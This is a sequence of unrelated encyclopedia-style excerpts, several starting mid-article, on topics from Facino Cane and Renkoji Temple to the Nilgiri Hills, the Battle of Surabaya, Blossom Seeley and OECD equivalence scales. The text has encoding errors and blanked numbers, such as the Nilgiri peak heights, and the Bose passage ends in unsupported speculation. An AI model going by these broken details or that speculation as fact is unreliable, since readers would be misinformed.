He trained in the military arts by fighting under Otto of Brunswick against Charles of Durazzo, in 1382. At 26 he became condottiero for the Scaliger and, later, Carraresi families. In 1387 he was hired by Theodore II, Marquess of Montferrat, with 400 knights, in the war against the House of Savoy. Facino's aim in wars was almost exclusively the enrichment of himself and his soldiers, resulting in savage acts of ruthlessness and cruelties against the population. This led Theodore to dismiss Facino in 1397, and the condottiero moved first back to the da Carrara and, in 1401, to the Visconti. In 1400 he had also created the small seigniory for himself in Borgo San Martino. In 1404 his personal dominions included also Alessandria, Novara and Tortona. In 1402, at the death of Duke Gian Galeazzo Visconti, he assumed the effective control of the Duchy of Milan.

It is assumed to be the purported location of the ashes of Netaji Subhas Chandra Bose, Indian freedom-fighter, which have been preserved since September 18, 1945. The small, well-preserved temple was established in 1594 inspired by the God of Wealth and Happiness. It belongs to the Nichiren sect of Buddhism that believes that human salvation lies only in the Lotus Sutra. Ashes of Subhash Chandra Bose A memorial to Subhas Chandra Bose in the compound of the Renk≈çji Temple According to the findings of the G.D. Khosla Commission, appointed by the Government of India in 1970, Subhash Chandra Bose's ashes were placed in the box at Taipei following the cremation of his remains. Bose had died at Taihoku Army Hospital on August 18, 1945. The ashes of Bose came to the temple for the purpose of a funeral ceremony but Rev. Mochizuki, father of the present Chief Monk, agreed to keep them in safe custody. Bose's funeral was held at 8:00 p.m. on September 18, 1945. Netaji‚Äôs associates observe his death anniversary on August 18 at the temple annually. It is customary for Indian officials arriving in Japan to travel to Renkoji, to offer prayers and pay respect to Bose at the pagoda that protects his remains: Prime Minister Jawaharlal Nehru was the first dignitary to visit the site in October 1957. President Dr. Rajendra Prasad followed him a year later. Indira Gandhi visited in 1969. Atal Bihari Vajpayee, former Prime Minister of India, first visited the temple during his term as Foreign Minister. He later visited it during his official visit to Japan on December 9, 2001. In 2000, the then Indian Minister of External Affairs, Jaswant Singh, visited the temple in November. The ashes of Bose are placed in a small golden pagoda. Controversy The Justice Mukherjee Commission of Inquiry submitted its report to the Indian Government on November 8, 2005. The report was tabled in Parliament on May 17, 2006. The probe said in its report that as Bose did not die in the plane crash, the ashes at the Renkoji Temple are not his. However, the Indian Government rejected the findings of the Commission. Authors and researchers who have been studying Subhash Chandra Bose's life believe ashes belong to a Japanese soldier as the Government of India denied DNA testing of the Ashes. Requests for anthropology tests have also been denied by the Government. Controversy increased when Prime Minister Narendra Modi did not visit the temple even when he was requested by the Indian High Commission in Japan. Authors believe that the Prime Minister may know something.

Origins In 2001, the House of Lords Science & Technology Select Committee Reporthttps://publications.parliament.uk/pa/ld200102/ldselect/ldsctech/47/4702.htm/ identified an urgent need for subject specific Continuing Professional Development for Science Teachers. In response to this and numerous other calls for action, the Department for Education and Skills and the Wellcome Trust invested ¬£51 million in the creation of the national network of Science Learning Centres. After a competitive tendering process the first Science Learning Centre opened its doors in October 2004. Today the Centres are more than just a location for training courses, they are rapidly becoming the focus for all science education activity in the UK. Continuing professional development Science Learning Centres run courses that provide continuing professional development for anyone involved in the teaching of science, from those working with reception aged children to post 16 students, including primary and secondary teachers, technicians, teaching assistants and FE lecturers. The aim of all Science Learning Centres is to reconnect teachers with the frontiers of their subject and the latest techniques for teaching it. Teachers who attend courses are given the opportunity to renew and extend their teaching skills by mixing with and learning from colleagues who face similar challenges to their own, and have access to the UK‚Äôs leading experts in science educational research. Centres There are 10 Science Learning Centres around the country. One to serve each of the nine English government regions and a National Science Learning Centre (based in the University of York) which provides training for anyone from England, Scotland, Wales or Northern Ireland. Each Centre is run by a consortium of organisations, which vary from local councils and professional bodies to universities, schools, science centres and industry partners. *The National Science Learning Centre, located in York *Science Learning Centre East of England, located in Hertfordshire *Science Learning Centre East Midlands, located in Leicester *Science Learning Centre London *Science Learning Centre North East, located in Durham *Science Learning Centre North West, located in Manchester *Science Learning Centre South East, at the University of Southampton is now the Mathematics and Science Learning Centre (MSLC) *Science Learning Centre South West, located in Bristol *Science Learning Centre West Midlands, located in Keele *Science Learning Centre Yorkshire & the Humber, located in Sheffield Courses The courses offered at the regional Centres usually feature one day‚Äôs training at the Centre, together with ongoing support through classroom exercises and online materials. The National Science Learning Centre, based at the University of York, offers residential courses for teachers, providing access to the facilities for teachers of two or more days, often spread across more than one term. Ambitions The national network of Science Learning Centres has been created with ambitious goals in mind; not least to help British teachers, lecturers, technicians and classroom assistants to lead the world in science education by 2015.

At least 24 of the Nilgiri Mountains' peaks are above , the highest peak being Doddabetta, at . Etymology The word Nilgiri, coming from Sanskrit neelam (blue) + giri (mountain), has been in use since at least 1117 CE. It is thought that the bluish flowers of kurinji shrubs gave rise to the name. Location The Nilgiri Hills are separated from the Karnataka Plateau to the north by the Moyar River. Three national parks border portions of the Nilgiri mountains. Mudumalai National Park lies in the northern part of the range where Kerala, Karnataka, and Tamil Nadu meet, covering an area of 321 km¬≤. Mukurthi National Park lies in the southwest part of the range, in Kerala, covering an area of 78.5 km¬≤, which includes intact shola-grassland mosaic, habitat for the Nilgiri tahr. Silent Valley National Park lies just to the south and contiguous with those two parks, covering an area of 89.52 km¬≤. Conservation The Nilgiri Hills are part of the Nilgiri Biosphere Reserve (itself part of the UNESCO World Network of Biosphere Reserves.UNESCO, World Heritage sites, Tentative lists, Western Ghats (subcluster nomination), retrieved 4/20/2007 World Heritage sites, Nilgiri Sub-Cluster), and form a part of the protected bio-reserves in India. Map of Nilgiri's Biosphere Reserve Nilgiri Hills from Masinangudi History The high steppes of the Nilgiri Hills have been inhabited since prehistoric times, demonstrated by a large number of artifacts unearthed by excavators. A particularly important collection from the region can be seen in the British Museum, including those assembled by colonial officers James Wilkinson Breeks, Major M. J. Walhouse and Sir Walter Elliot. The first recorded use of the word Nila applied to this region can be traced back to 1117 AD. In the report of a general of Vishnuvardhana, King of Hoysalas, who in reference to his enemies, claimed to have \\"frightened the Todas, driven the Kongas underground, slaughtered the Poluvas, put to death the Maleyalas, terrified Chieftain Kala Nirpala and then proceeded to offer the peak of Nila Mountain (presumably Doddabetta or Rangaswami peak of Peranganad in East Nilgiris) to Lakshmi, Goddess of Wealth.\\" A hero stone (Veeragallu) with a Kannada inscription at Vazhaithottam (Bale thota) in the Nilgiri District, dated to 10th century CE, has been discovered. A Kannada inscription of Hoysala king Ballala III (or his subordinate Madhava Dannayaka's son) from the 14th century CE has been discovered at the Siva (or Vishnu) temple at Nilagiri Sadarana Kote (present- day Dannayakana Kote), near the junction of Moyar and Bhavani rivers, but the temple has since been submerged by the Bhavani Sagar dam. In 1814, as part of the Great Trigonometrical Survey, a sub-assistant named Keys and an apprentice named McMahon ascended the hills by the Danaynkeucottah (Dannayakana Kote) Pass, penetrated into the remotest parts, made plans, and sent in reports of their discoveries. As a result of these accounts, Messrs. Whish and Kindersley, two young Madras civilians, ventured up in pursuit of some criminals taking refuge in the mountains, and proceeded to observe the interior. They soon saw and felt enough favorable climate and terrain to excite their own curiosity, and that of others. Stonehouse, 1905 After the early 1820s, the hills were developed rapidly under the British Raj, because most of the land was already privately owned by British citizens. It was a popular summer and weekend getaway for the British during the colonial days. In 1827, Ooty became the official sanatorium and the summer capital of the Madras Presidency. Many winding hill roads were built. In 1899, the Nilgiri Mountain Railway was completed by influential and enterprising British citizens, with venture capital from the Madras government. In the 19th century, when the British Straits Settlement shipped Chinese convicts to be jailed in India, the Chinese men settled in the Nilgiri mountains near Naduvattam after their release and married Tamil Paraiyan women, having mixed Chinese-Tamil children with them. They were documented by Edgar Thurston. Peaks in the Nilgiris Topographic map of Nilgiri Hills showing some peaks View of Nilgiri hills from Doddabetta The highest point in the Nilgiris and the southern extent of the range is Doddabetta Peak (), 4 km east southeast of Udhagamandalam, .

The line, along with the collieries, became the sole property of John Brown & Company of Sheffield, in 1910, giving the line its local name. John Brown and Company were also the owners of other collieries in South Yorkshire, including Rotherham Main, which was served by a Great Central branch line.  History  Roundwood Colliery, situated in the Don Valley, between the lines of the Midland Railway, north of Parkgate and Rawmarsh and the Manchester, Sheffield and Lincolnshire Railway, north of Parkgate and Aldwarke was established in the 1860s and had connections to both railways and to staithes alongside the river. In 1898, a new company was formed to take over Roundwood Colliery and to develop a new colliery at Silverwood, near Thrybergh. These collieries and the boat staithes were to be linked by a railway. The company was originally known as \\"The Roundwood and Dalton Colliery Co.\\", becoming Dalton Main Collieries Limited in December 1899. The railway companies serving Roundwood were approached to build a line to Silverwood but both declined and so it was built privately as \\"The Roundwood and Dalton Colliery Railway\\". The line was opened in 1901 and its main engineering work was a girder bridge crossing the River Don which was built by Newton, Chambers & Company. The line was known for its gradients, the main section being between 1 in 44 and 1 in 56. The line became part of the Rotherham, Maltby and Laughton Railway which, in turn, became the major part of the Great Central and Midland Railways Joint Committee in South Yorkshire.  Accidents  As may be imagined on a line with steep gradients there was a problem with runaway accidents. In August 1905, a train going down the hill from Silverwood Colliery to Roundwood could not hold back its load and the locomotive, Dalton Main Colliery No.4 (Andrew Barclay, Works No. 1021, built 1904) was overpowered. The crew jumped after passing over the River Don bridge. The driver suffered only shock. The fireman was slightly injured. At the point where the colliery line passed below the Great Central line the locomotive left the rails but stayed upright through the bridge and fell into the marshy ground beyond. The wagons were totally destroyed and the track seriously damaged. The locomotive was repaired and survived a further 21 years until being scrapped. Slippery rails covered with natural evening moisture together with water dripping from the wagonloads of 'slack' were blamed. On 30 September 1910, not long after the railway had become the property of the G.C. & M. J.R., a loaded coal train leaving Silverwood Colliery with 50 wagons went out of control and ran away. The Mexborough locomotive crew jumped, the driver sustaining minor injuries, the fireman being bruised. Catchpoints prevented the train reaching the main line, although some of the wagons did so. The locomotive ended on the canal towpath. The signal box, Thrybergh Junction, was saved, although it did suffer in a later accident and fell backwards into the river. The signalman, reportedly, left his box hurriedly - hardly surprising!  Passenger services  The line did not have a regular public passenger service. However, the colliery company, by an agreement with the railway committee, did run Workmen's Trains, often referred to as Paddy Mails using seven coaches which were bought from the Mersey Railway in early 1905. These trains linked Roundwood Colliery, the river boat staithe and Silverwood Colliery. Under a similar agreement, the colliery company could also work their own trains over the line, for internal traffic only. In 1959, a platform was constructed on the line, near to Whinney Hill in Thrybergh, to serve the \\"Children's Outings\\" organised by local Working Men's Clubs. This was known as Thrybergh Tins and closed in the mid-1960s.  Closures  The connection to the Great Central at Roundwood was removed in March 1914. The line from Don Bridge East Junction to Roundwood was closed in the 1960s but a single track was retained as a 'trap' for runaways. The line beyond Silverwood to Hellaby (Great Central, Hull & Barnsley and Midland Joint) was closed in 1967 for the construction of a motorway bridge: it never reopened, being officially closed from March 1969. The main line from Thrybergh Junction to Silverwood was singled in spring 1975. British Steel The part of line at Roundwood, using the original bridge (Don Bridge) over the River Don, was bought and reopened in the mid-1970s, by British Steel Corporation in connection with their new Thrybergh Bar Mill.

The peak of the battle was in November 1945. The battle was the largest single battle of the revolution and became a national symbol of Indonesian resistance. Considered a heroic effort by Indonesians, the battle helped galvanise Indonesian and international support for Indonesian independence. 10 November is celebrated annually as Heroes' Day (Hari Pahlawan). By the time the Allied forces arrived at the end of October 1945, the Pemuda (\\"youth\\") foothold in Surabaya City was described as \\"a strong unified fortress\\". Fighting broke out on 30 October after the British commander, Brigadier A. W. S. Mallaby was killed in a skirmish. The British retaliated with a co-ordinated sweep that began on 10 November, under the cover of air attacks. Although the Colonial forces largely captured the city in three days, the poorly armed Republicans fought for three weeks, and thousands died as the population fled to the countryside. Despite the military defeat suffered by the Republicans and a loss of manpower and weaponry that would severely hamper Republican forces for the rest of the revolution, the battle and defence mounted by the Indonesians galvanised the nation in support of independence and helped garner international attention. For the Dutch, it removed any doubt that the Republic was not simply a gang of collaborators without popular support. It also had the effect of convincing Britain that wisdom lay on the side of neutrality in the revolution; within a few years, in fact, Britain would support the Republican cause in the United Nations.  Background  On 17 August 1945, Sukarno and Hatta declared the independence of Indonesia in Jakarta, two days after the Japanese emperor's surrender in the Pacific. As the news about the independence declaration spread throughout the archipelago, ordinary Indonesians felt a sense of freedom that led most to regard themselves as pro-Republican. In the following weeks, power vacuums existed, both from outside and within Indonesia, creating an atmosphere of uncertainty, but also one of opportunity. On 19 September 1945, a group of Dutch internees supported by the Japanese raised the Dutch flag outside the Hotel Yamato (formerly Hotel Oranje, now Hotel Majapahit) in Surabaya, East Java. This provoked nationalist Indonesian militia, who overran the Dutch and Japanese and tore off the blue part of the Dutch flag, changing it into the Indonesian flag. The leader of the Dutch group, Mr Ploegman, was killed because of mass anger. A defiant Bung Tomo in Surabaya, one of the most revered revolutionary leaders, wearing Imperial Japanese Army uniform. This photo became an iconic image of the revolution. The senior Japanese commander in Surabaya, Vice Admiral Shibata Yaichiro, threw his support behind the Republicans and gave Indonesians ready access to arms. On 3 October, he surrendered to a Dutch Navy captain, the first Allied representative to arrive. Yaichiro ordered his forces to hand over their remaining weapons to the Indonesians. The Indonesians were expected to hand them to the newly arrived Allied troops but did not do so. British forces brought in a small Dutch military contingent which it termed the Netherlands Indies Civil Administration (NICA). The British became worried about the increasing boldness and apparent strength of the nationalists, who attacked demoralised Japanese garrisons across the archipelago with rudimentary weapons such as bamboo spears to seize their arms. The \\"bamboo spear\\" monument is still a common feature in Indonesian cities,e.g. Jakarta, Surabaya and Pontianak.https://www.insideindonesia.org/the-forgotten-killings The main goals of British troops in Surabaya were seizing weapons from Japanese troops and Indonesian militia, taking care of former prisoners-of-war (POWs), and sending the remaining Japanese troops back to Japan. In September and October 1945 a series of incidents took place involving pro-Dutch Eurasians, and atrocities were committed by Indonesian mobs against European internees. In late October and early November, the leadership of the mass Muslim organisations Nahdlatul Ulama and Masyumi declared that war in defence of the Indonesian motherland was Holy War, and thus an obligation for all Muslims. Kyai and their students began to stream into Surabaya from Islamic boarding schools throughout East Java. The charismatic Bung Tomo made use of local radio to encourage an atmosphere of fanatical revolutionary fervor across the city. Six thousand British Indian troops were sent into the city on 25 October to evacuate European internees and within three days fighting began. After heavy fighting between the British Indian forces and around 20,000 Indonesian armed regulars of the newly formed People's Security Army (TKR) and mobs of 70,000‚Äì140,000 people, the British flew in the influential President Sukarno, Vice-President Hatta and his ministers Amir Sjarifuddin, and a ceasefire was achieved on 30 October.  Prelude  On 26 October 1945, Brigadier A. W. S. Mallaby reached an agreement with Mr Suryo, the Republic of Indonesia's governor of East Java, that the British would not ask Indonesian troops/militia to hand over their weapons. An apparent misunderstanding about the agreement between British troops in Jakarta (led by Lieutenant General Sir Philip Christison) and Mallaby's troops in Surabaya was to have serious ramifications. Initially, British troops in the city comprised some 6,000-strong lightly armed British Indian soldiers from the 49th Infantry Brigade of the 23rd Indian Division. When the battle reached its peak, the British sent in additional troops which consisted of 24,000 fully armed soldiers from the 5th Indian Division, 24 US M4 Sherman medium tanks, along with a similar number of M3 Stuart light tanks, 24 battle-ready aircraft, together with 2 British Royal Navy cruiser ships and 3 accompanying destroyer escorts. Indonesian forces consisted of 20,000 soldiers from the newly formed Tentara Keamanan Rakyat (TKR; People's Security Armed Forces) from its East Java Regional Command and an estimated 100,000‚Äì120,000 irregulars and militias. The TKR was formed partly by the former members of Peta, a semi- military organisation during the Japanese occupation and a few local officers of the former KNIL. The irregulars consisted of pro-Independence mobs, armed with rifles, swords, and bamboo spears. Some of their weapons were taken from surrendered Japanese troops.  Battle   Beginning  On 27 October 1945, a British plane from Jakarta dropped leaflets over Surabaya urging all Indonesian troops and militia to surrender their weapons. The leaders of the Indonesian troops and militia were angered, seeing it as a breaking of the agreement reached with Mallaby earlier. On 28 October 1945, they attacked the British troops in Surabaya, killing two hundred soldiers. On 30 October the British flew Sukarno (president of RI), Mohammad Hatta (the vice-president of RI), and Amir Syarifuddin Harahap (the minister of information of Indonesia) into Surabaya to possibly negotiate a cease fire. A ceasefire was negotiated with Major General Hawthorn (the commander of 23rd British Indian Division) and Brigadier Mallaby and immediately adhered to. Fighting, however, soon recommenced due to confused communications and mistrust between the two sides, leading to the famed Battle of Surabaya.  Death of Brigadier Mallaby  The burnt-out car of Brigadier Mallaby where he was killed on 31 October 1945. On 30 October 1945, Brigadier A. W. S. Mallaby, the British brigade commander in Surabaya, was travelling about Surabaya to spread the news about the new agreement to his troops. At this time, Mallaby's team were forbidden to carry any weapons except hand grenades. Later while patrolling, they received information that there was a mass of Indonesian militia advancing to International Bank near Jembatan Merah (\\"The Red Bridge\\"). The team headed to the area but were trapped by shooting between Dutch soldiers who guarded the bank and local militias. When his car approached the British troops' post in the International building near the Jembatan Merah, it was surrounded by Indonesian Republican militia. Shortly after, Mallaby was shot and killed by the militia under confused circumstances. Captain R. C. Smith, who was in the stationary car, reported that a young Republican (teen) suddenly shot and killed Mallaby after a short conversation. Smith then reported throwing a grenade from the car in the direction of where he thought the shooter had hidden. Although he was not sure whether or not it hit its target, the explosion caused the back seat of the car to ignite. Other accounts, according to the same source, stated that it was the explosion and not a shooter that killed Mallaby. The remaining members of Mallaby's team ran and jumped into the Kalimas River. The death of Mallaby incited instant reaction in the Allied army because they knew Mallaby was on a non-combat mission that day. Regardless of its exact details, Mallaby's death was a significant turning point in the hostilities in Surabaya, and a catalyst for the battle to come. The British ordered an Indonesian surrender, and on 10 November they launched a large retaliatory attack.  Main battle  Bren gunners of 3/9th Jat Regiment cover the advance of their regiment against Indonesian nationalists, circa 15‚Äì16 November 1945. Lieutenant General Sir Philip Christison was angered when he heard that Brigadier Mallaby had been killed in Surabaya. During a lull in the fighting, the British brought in reinforcements and evacuated the internees. An additional two brigades (9th and 123rd Indian) of the 5th Indian Division led by Major General Robert Mansergh were deployed with Sherman and Stuart tanks, 2 cruisers and 3 destroyers (including ) in support. At dawn on 10 November, a day now commemorated in Indonesia as Heroes' Day, British troops began a methodical advance through the city under the cover of naval and air bombardment. Fighting was heavy, with British troops clearing buildings room by room and consolidating their gains. Despite the fanatical resistance of the Indonesians, half of the city was conquered in three days and the fighting was over in three weeks (29 November). Estimates of Indonesian deaths range between 6,300 and 15,000, and perhaps 200,000 fled the devastated city. British Indian casualties totalled 295 killed and missing.  Aftermath  The Republicans lost much of their manpower, but it was the loss of weaponry that would severely hamper Republican military efforts for the remainder of the independence struggle. The battle for Surabaya was the bloodiest single engagement of the war, and demonstrated the determination of the rag-tag nationalist forces; their sacrificial resistance became a symbol and rallying cry for the revolution. It also made the British reluctant to be sucked into a war, considering how stretched their resources in southeast Asia were during the period after the Japanese surrender; within a few years, in fact, Britain openly supported the Republican cause in the United Nations. It was also a watershed for the Dutch as it removed any doubt that the Republic was a well-organized resistance with popular support. In November 1946, the last British troops left Indonesia. The \\"Heroes of the 10 November\\" statue in Surabaya commemorates this battle. 10 November is now commemorated in Indonesia as \\"Heroes' Day\\", in memory of the battle. The Scottish-American Indonesian sympathiser K'tut Tantri also witnessed the Battle of Surabaya, which she later recorded in her memoirs Revolt in Paradise. Prior to the fighting, she and a group of Indonesian rebels associated with Bung Tomo had established a secret radio station in the city which broadcast pro-Indonesian Republic messages that were directed at the British soldiers in the city. She noted that several British soldiers were unhappy with the Dutch for misleading them about the Indonesian Republicans being Japanese puppets and extremists. Following the British bombardment of the city, Tantri contacted several foreign diplomats and commercial attaches from Denmark, Switzerland, the Union of Soviet Socialist Republics, and Sweden. These countries had representatives in Surabaya. They agreed to inform their respective governments about the fighting in Surabaya and to take part in a joint broadcast protesting continuation of the fighting and calling for a ceasefire.  In popular culture  The battle of Surabaya has become the theme and background of several Indonesian films, such as Cinema of Indonesia 1990 film Soerabaia 45' Merdeka atau Mati'. The battle was shown briefly in the 2013 film Sang Kiai, which depicted the death of Brigadier Mallaby at the hands of an Indonesian militia from Laskar Hizbullah and the first day of the battle itself. In 2013, the Battle of Surabaya was commemorated in a 2D animated film called the Battle of Surabaya, which was scheduled to be released in August 2015. The film is produced by Mohammad Suryanto and focuses on a teenage courier named Musa. On a side note, the Walt Disney Studios took an interest in this animated cartoon, and the movie is now part of Disney's distribution franchise. It was stated that the film would have an English voice over for distribution outside Indonesia after the movie's original release in Indonesia.

History  The beginnings of Partido High School went back to the time when the Provincial Board of Camarines Sur announced that whichever town that could meet the basic requirements of a school site, an enrollment of at least 200 students, and a building that could house the classes, a branch of Camarines Sur National High School (in Naga City) would be established. Goa mobilized its whole community. A school site was secured ‚Äì a riceland located at the boundary of Goa ‚Äì San Jose. In June 1941, while war threats circulated, the Partido High School opened its first classes with a little over 200 first year students in four sections. They came from different towns in Goa Partido, representing all social classes. The Pacific War temporarily halted the momentum and PHS reopened in 1945. The pioneer students were accelerated to second year a few months after classes resumed. Before the end of the school year, they were again accelerated to third year. They were called the ‚Äúsuperstudents‚Äù for having been accelerated twice in a school year. Finally, the first batch of 120 students graduated in 1947. The issue of a permanent school site cropped up and was settled when representatives from the Bureau of Public Schools came and recommended a transfer. Finally, in 1948, the school moved to its new site, a 10-hectare lot donated by the civic-spirited citizens of Goa. Its first buildings were constructed through the pork barrel funds of then Congressman Sebastian Moll and from Parent-Teacher Association (PTA) funds. In the latter part of 1970, the PTA and Municipal Council of Goa sought Congressman Felix Fuentebella to file a bill in Congress for the conversion of Partido High School into Partido National High School. Unfortunately, martial law was declared in 1972. It was only in 1974 when Partido National High School became operative. It was this time that the school entered its ‚ÄúGolden Era‚Äù when it almost dominated all academic, athletic and cultural competitions. It garnered plums in both regional and national secondary press conferences. The decade of the ‚Äò70s likewise saw the establishment of other secondary schools within the district. In 1974, the Municipal Council of San Jose under then Mayor Gil Pacamarra established the Salogon Barangay High School with Dr. Seneca Z. Tacurda as its first principal. It was converted into San Jose Fisheries School pursuant to Batas Pambansa Blg. 406 approved on June 10, 1983 with its new status as a national vocational school. SJFS would later on become the PSU-Salogon Campus. In 1977, another barangay high school within the term of Mayor Pacamarra was born in the town of San Jose, Camarines Sur. It acquired its status as San Jose Nationalized High School in 1987, when the new government gave budgetary priority to education as a consequence of the newly ratified 1987 Philippine Constitution. It was converted to the San Jose Polytechnic Institute (SJPI) on March 30, 1995 by virtue of Republic Act No. 7972 through the efforts of Hon. Congressman Arnulfo P. Fuentebella. Dr. Marie Jane Pacamarra was the first administrator of SJPI, now the PSU-San Jose Campus. Congressman Felix Fuentebella authorized the creation of Goa High School. In 1976, the late superintendent Carlos Borjal of Camarines Sur National College of Arts & Trades (in Naga City) requested from the Ministry of Education the transfer of Goa High School to Barangay Nato, Sagnay, Camarines Sur and was acted upon favorably in 1977. A year later, its name was changed to Governor Mariano Fuentebella Memorial Fisheries School with Francisco Romanes as principal. On March 14, 1998, it was converted to Governor Mariano Fuentebella Memorial College of Fisheries (GMFMCF) pursuant to Republic Act No. 8594 and then to the PSU-Sagnay Campus. Dr. Pedro V. Vargas was its first administrator. In Caramoan, Camarines Sur, the Caramoan Vocational-Technical School (CVTS), now the PSU-Caramoan was born in 1994 in accordance with Republic Act No. 7828, which was also through the efforts of Congressman Arnulfo P. Fuentebella and was organized under the leadership of the late Manuel dela Torre. Dr. Vicente Lleno became its first Administrator. In Tinambac, Camarines Sur, the Tinambac Polytechnic Institute (TPI) came into existence by virtue of Republic Act No. 7958 signed March 29, 1995, due to the initiative of Cong. Arnulfo P. Fuentebella and was organized by Dr. Gregilda Pan before its first Superintendent, Dr. Fortuno P. Villanueva, took over. TPI would later on become the PSU-Tinambac. In the northern part of Lagonoy, Barangay Cabotonan, the Lagonoy Fishery School (LFS), now the PSU-Lagonoy, came into being pursuant to Republic Act No. 8417. Ms. Trinidad Soltes is its first ever administrator since its existence in 1997. The momentum of Partido National High School was sustained by Congressman Arnulfo Fuentebella in 1986, when, through his representation, Partido National High School was converted into Partido State College by virtue of Presidential Decree No. 2011. The different stakeholders in the province of Camarines Sur clamored for the conversion of Partido State College, together with the six other schools/colleges in the district, to a state university. Finally, the greatest boon came to Partidoanos when Republic Act No. 9029 authored by Speaker Arnulfo P. Fuentebella was signed into law by President Gloria Macapagal- Arroyo on March 5, 2001 creating Partido State University in Goa Camarines Sur.

Butler played for Walsall, Cambridge United and Reading. He also had spells with Rotherham United, Grimsby Town, Burton Albion and Worcester City. Career Walsall Butler started his career at Walsall, where he rose through the youth ranks. He made his senior debut in the 1993‚Äì94 season. Cambridge United and Reading His career at Walsall faltered, and he was allowed to join Cambridge United for ¬£22,500 in the summer of 1997. A prolific spell at the Abbey Stadium prompted Reading to pay around the ¬£750k mark for his services in February 2000. Butler scored on his debut against Preston North End and continued his goal-scoring form ‚Äì including a goal in the 2000‚Äì01 Football League Second Division play-off Final in May 2001, although Reading went on to lose the match 3‚Äì2 to Butler's former team Walsall. On 6 November 2001, Butler was stretchered off during Reading's 2‚Äì0 win over Wrexham, suffering serious damage to his ankle. He broke his ankle and fibula, and suffered ligament damage competing for a ball on the touchline after his foot stuck in the ground. He did not play again until April 2002 against Peterborough United, but his goals that season still helped Reading to get promoted to the First Division in 2nd place. Rotherham United and Return to Walsall After his injury, Butler could not recapture the form for Reading that he'd shown before, and after floating in and out of the first-team, he was sold to Rotherham United in a ¬£150,000 deal in August 2003. Butler then moved back to Walsall three seasons later on a free transfer, signing a two- year deal on 1 July 2006. Grimsby Town In October 2007 Butler, whose contract with Walsall was due to end at the end of the 2007‚Äì08 season, signed a three-month loan deal at League Two side Grimsby Town. The move lasted until January at which point Grimsby signed him on a permanent deal.\\"Grimsby complete Butler signing\\" BBC Sport Retrieved on 16 October 2007 He made his debut for Grimsby on 20 October against Wycombe Wanderers. Butler's time at Grimsby was troubled due to the players concerns that his 350-mile trip from his Worcester home to Cleethorpes were affecting his performances on and off the pitch, and he notably missed training regularly due to the time it took to commute. Alan Buckley attempted to sell Butler to Hereford United on transfer deadline day, which was only two months after signing a two-year deal at Blundell Park, but the player rejected Hereford's contract offer. In an attempt to amend relations with Grimsby, Butler returned to regular training and won back his place in the side next to Danny North and helped the Mariners climb from 19th in League Two, to 10th. Despite Butler's renewed attempts to salvage his Grimsby career, he reignited his travel problems, and this eventually saw the player drop out of contention at the club. He played his last game for the club in the League Cup fixture with Blackburn Rovers and after that he was shelved by Buckley who dropped him to the reserves, which is where he remained for the rest of his time at Grimsby before he was eventually released in October 2008 by the club's new manager Mike Newell due to the aforementioned travel problems.\\"Grimsby sack Martin Butler over 350 mile commute\\" Daily Mirror Retrieved on 18 June 2017 Burton Albion and Worcester City In February 2009, he was announced as Roy McFarland's first signing at non-League club Burton Albion when he signed a contract until May 2009, he was released at the end of the season.

Retrieved 2010-10-23. was an American singer, dancer, and actress. Biography Sheet music cover for the Marquard and Seeley production. Seeley was born Minnie Guyer, in San Francisco. A top vaudeville headliner, she was known as the \\"Queen of Syncopation\\" and helped bring jazz and ragtime into the mainstream of American music. She introduced the Shelton Brooks classic \\"Some of These Days\\" in vaudeville in 1910, one year before Sophie Tucker recorded it in 1911. Seeley herself was a major recording star with a series of solo records in the 1920s, and her biggest hits included \\"Way Down Yonder in New Orleans\\", \\"Rose Room\\", Irving Berlin's \\"Lazy\\", \\"Yes Sir, That's My Baby\\" and her signature song, \\"Toddling the Todalo\\". She was featured in two 1933 films, Blood Money with Judith Anderson, and Broadway Through a Keyhole with Russ Columbo and Texas Guinan. Seeley was one half of the vaudeville team of Blossom Seeley and Benny Fields. When they played the Palace Theatre in its Golden Era, they always had the No. 1 spot, even when sharing the bill with such stars as Jack Benny, George Burns and Gracie Allen, and George Jessel. Burns and Allen would remain their closest lifelong friends. In 1927, they filmed one of the first Vitaphone sound shorts, Blossom Seeley and Benny Fields in which Blossom introduced the song \\"Hello, Bluebird\\", later re-popularized by Judy Garland in the movie I Could Go On Singing. The story of their marriage and career was made into the movie Somebody Loves Me (1952) with Betty Hutton and Ralph Meeker, which revived their careers and led to a string of TV appearances on The Ed Sullivan Show. Seeley and Fields also recorded three LP records in the 1950s for the Decca, MGM and Mercury labels. Seeley continued to perform as a solo after Fields' death in 1959 and was one of the legends who starred on the 1961 CBS special Chicago and All That Jazz. She also sang on the accompanying Verve album, which was her first in stereo. She made two appearances on The Garry Moore Show and sang her version of the Frank Sinatra hit \\"My Kind of Town\\" on a 1966 Ed Sullivan Show. Her last TV appearance was with Mike Douglas, which he taped at the nursing home where she was living. Personal life Blossom Seeley was married three times: to Joe Kane; to Baseball Hall of Famer Rube Marquard of the New York Giants (a book by Noel Hynd detailing their relationship, Marquard and Seeley, was published in 1996.\\"Rube Marquard\\" , bioproj.sabr.org; retrieved 2010-10-23.) and to Fields. She had one child by her second marriage, Richard Marquard Jr. Seeley died in New York City, aged 82.

Total household income is then divided by the sum of the weightings to yield a representative income. Equivalisation scales are used to adjust household income, taking into account household size and composition, mainly for comparative purposes.  OECD equivalence scale This is also called the \\"Oxford scale\\" and the \\"old OECD scale\\". Mentioned by the OECD in the 1980s for possible use in countries without an established scale.\\"WHAT ARE EQUIVALENCE SCALES?\\". OECD. *1.0 to the first adult; *0.7 to the second and each subsequent person aged 14 and over; *0.5 to each child aged under 14.  OECD-modified scale The OECD-modified scale is widely used across Europe and used by the Statistical Office of the European Union (Eurostat). It adjusts household income to reflect the different resource needs of single adults, any additional adults in the household, and children in various age groups. To calculate equivalised income using the modified OECD equivalence scale, each member of the household is first given an equivalence value: *1.0 to the first adult; *0.5 to the second and each subsequent person aged 14 and over; *0.3 to each child aged under 14. 30px Text was copied from this source, which is available under an Open Government Licence v3.0. ¬© Crown copyright. Single adult households are taken as the reference group and are given a value of 1. For larger households, each additional adult is given a smaller value of 0.5 to reflect the economies of scale achieved when people live together, arising when households share resources such as water and electricity, which reduces living costs per person. Children under the age of 14 are given a value of 0.3 to take account of their lower living costs, while children aged 14 and over are given a value of 0.5 because their living costs are assumed to be the same as an adult. The equivalence values for each household member are summed to give a total equivalence number for the household. For example, a household with a total equivalence value of 2 would show that the household needs twice the income of a single adult household in order to achieve a comparable standard of living. Square root scale This has been adopted by more recent OECD publications. The household income is divided by the square root of household size.

